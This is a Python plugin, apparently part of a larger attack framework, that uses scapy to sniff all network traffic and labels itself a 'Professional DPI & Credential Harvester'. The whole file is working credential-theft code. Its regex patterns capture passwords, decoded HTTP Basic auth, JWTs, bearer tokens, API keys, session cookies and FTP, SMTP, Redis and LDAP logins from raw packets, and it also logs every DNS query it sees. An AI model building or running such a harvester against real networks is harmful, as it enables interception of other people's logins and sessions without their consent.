from core.plugin_manager import BasePlugin
from scapy.all import AsyncSniffer, IP, TCP, UDP, Raw, DNS, DNSQR, DNSRR
import asyncio
import re
import base64
from datetime import datetime

class SnifferPlugin(BasePlugin):
    def __init__(self):
        self.sniffer = None
        self.credentials = []
        self.dns_log = []
        self.packet_count = 0
        self.interesting_ports = {
            21: "FTP", 23: "Telnet", 25: "SMTP", 80: "HTTP",
            110: "POP3", 143: "IMAP", 389: "LDAP", 3306: "MySQL",
            5432: "PostgreSQL", 1433: "MSSQL", 27017: "MongoDB",
            6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
            5900: "VNC", 11211: "Memcached",
        }

        # Extended credential extraction patterns
        self.patterns = [
            # Form data credentials
            (r"(?i)(user|username|login|usr|email|account)\s*[:=]\s*([^&\s\r\n]{2,80})", "FORM_AUTH"),
            (r"(?i)(pass|password|pwd|passwd|secret)\s*[:=]\s*([^&\s\r\n]{2,80})", "FORM_AUTH"),
            # HTTP Basic Auth
            (r"(?i)Authorization:\s*Basic\s+([a-zA-Z0-9+/=]{4,})", "HTTP_BASIC"),
            # HTTP Bearer / JWT
            (r"(?i)Authorization:\s*Bearer\s+(eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+)", "JWT"),
            (r"(?i)Authorization:\s*Bearer\s+([a-zA-Z0-9_-]{20,})", "BEARER"),
            # API Keys in headers
            (r"(?i)(x-api-key|api-key|apikey|x-auth-token|x-access-token):\s*([a-zA-Z0-9_-]{16,})", "API_KEY"),
            # Cookies with session tokens
            (r"(?i)Cookie:.*?(session|sess_id|PHPSESSID|JSESSIONID|connect\.sid|_session)\s*=\s*([a-zA-Z0-9_-]{16,})", "SESSION"),
            # Set-Cookie with auth tokens
            (r"(?i)Set-Cookie:.*?(token|auth|session)\s*=\s*([^;\s]{8,})", "SET_COOKIE"),
            # FTP
            (r"^USER\s+([^\r\n]+)", "FTP"),
            (r"^PASS\s+([^\r\n]+)", "FTP"),
            # POP3
            (r"^USER\s+([^\r\n]+)", "POP3"),
            (r"^\+OK.*pass", "POP3"),
            # SMTP AUTH
            (r"AUTH\s+(LOGIN|PLAIN)\s*([a-zA-Z0-9+/=]*)", "SMTP_AUTH"),
            # MySQL auth greeting
            (r"mysql_native_password", "MYSQL_AUTH"),
            # Redis commands
            (r"(?i)\*2\r\n\$4\r\nAUTH\r\n\$\d+\r\n(.+)\r\n", "REDIS_AUTH"),
            # LDAP bind
            (r"(?i)cn=([^,]+),.*dc=", "LDAP_BIND"),
            # JSON credentials
            (r'"(?:password|passwd|secret|token|api_key)":\s*"([^"]{2,})"', "JSON_CRED"),
        ]

    @property
    def name(self) -> str:
        return "Sniffer"

    @property
    def description(self) -> str:
        return "Professional DPI & Credential Harvester"

    async def start(self):
        self.sniffer = AsyncSniffer(prn=self._process_packet, store=False)
        self.sniffer.start()
        self.emit("INFO", {"msg": "Deep Packet Inspection active — monitoring all protocols"})

    async def stop(self):
        if self.sniffer:
            self.sniffer.stop()
            self.emit("INFO", {"msg": f"Sniffer stopped. Captured {len(self.credentials)} credentials, {self.packet_count} packets"})

    def _process_packet(self, pkt):
        if IP not in pkt:
            return

        self.packet_count += 1
        src_ip = pkt[IP].src
        dst_ip = pkt[IP].dst
        sport = pkt[TCP].sport if TCP in pkt else (pkt[UDP].sport if UDP in pkt else 0)
        dport = pkt[TCP].dport if TCP in pkt else (pkt[UDP].dport if UDP in pkt else 0)

        # Identify protocol by port
        proto = self.interesting_ports.get(dport, self.interesting_ports.get(sport, ""))

        summary = {
            "src": src_ip, "dst": dst_ip,
            "sport": sport, "dport": dport,
            "proto": proto or pkt[IP].proto,
            "len": len(pkt), "type": "PKT"
        }

        # DNS logging — track all DNS queries for domain intelligence
        if DNS in pkt and pkt.haslayer(DNSQR):
            qname = pkt[DNSQR].qname.decode(errors='ignore').rstrip('.')
            self.dns_log.append({"query": qname, "src": src_ip, "ts": datetime.now().isoformat()})
            summary["type"] = "DNS"
            summary["query"] = qname

        # Credential extraction from raw payload
        if Raw in pkt:
            payload = pkt[Raw].load
            text = payload.decode(errors='ignore')

            for pattern, cred_type in self.patterns:
                matches = re.findall(pattern, text)
                if matches:
                    for m in matches:
                        raw_cred = m if isinstance(m, str) else ":".join(m)
                        # Decode Base64 for HTTP Basic Auth
                        decoded = raw_cred
                        if cred_type == "HTTP_BASIC":
                            try:
                                decoded = base64.b64decode(raw_cred).decode(errors='ignore')
                            except Exception:
                                pass

                        cred_entry = f"[{cred_type}] {src_ip}:{sport} -> {dst_ip}:{dport} | {decoded}"
                        if cred_entry not in self.credentials:
                            self.credentials.append(cred_entry)
                            summary["type"] = "AUTH"
                            self.emit("CREDENTIAL", {
                                "msg": f"Credential captured: {decoded[:60]}",
                                "type": cred_type,
                                "src": src_ip, "dst": dst_ip,
                                "cred": decoded[:200]
                            })

            # Detect cleartext protocols on known ports
            if dport in (21, 23, 110, 143, 25) and len(text) > 3:
                summary["cleartext"] = text[:100]

        self.emit("PACKET", summary)

    def get_dns_log(self):
        return self.dns_log[-200:]
